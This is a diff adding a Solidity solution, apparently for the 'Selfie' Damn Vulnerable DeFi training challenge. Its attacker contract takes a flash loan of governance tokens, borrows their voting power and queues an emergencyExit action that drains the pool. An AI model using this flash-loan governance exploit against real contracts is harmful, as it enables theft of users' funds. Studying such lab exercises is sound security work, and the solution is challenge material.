@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,7 +63,15 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        // Deploy attacker contract which will borrow the tokens, gain the votes
+        // and queue the malicious governance action in its constructor.
+        SelfieAttacker attacker = new SelfieAttacker(pool, governance, token, recovery);
+
+        // Action cannot be executed until the delay has passed
+        skip(governance.getActionDelay());
+
+        // Execute the queued action which transfers all tokens to the recovery account
+        attacker.execute();
     }
 
     /**
@@ -72,5 +81,34 @@ contract SelfieChallenge is Test {
         // Player has taken all tokens from the pool
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+    }
+}
+
+contract SelfieAttacker is IERC3156FlashBorrower {
+    SelfiePool private immutable pool;
+    SimpleGovernance private immutable governance;
+    DamnValuableVotes private immutable token;
+    address private immutable recovery;
+    uint256 public actionId;
+
+    constructor(SelfiePool _pool, SimpleGovernance _governance, DamnValuableVotes _token, address _recovery) {
+        pool = _pool;
+        governance = _governance;
+        token = _token;
+        recovery = _recovery;
+
+        pool.flashLoan(this, address(_token), _pool.maxFlashLoan(address(_token)), "");
+    }
+
+    function onFlashLoan(address, address, uint256 amount, uint256, bytes calldata) external override returns (bytes32) {
+        token.delegate(address(this));
+        bytes memory data = abi.encodeWithSelector(SelfiePool.emergencyExit.selector, recovery);
+        actionId = governance.queueAction(address(pool), 0, data);
+        token.approve(address(pool), amount);
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+
+    function execute() external {
+        governance.executeAction(actionId);
     }
 }
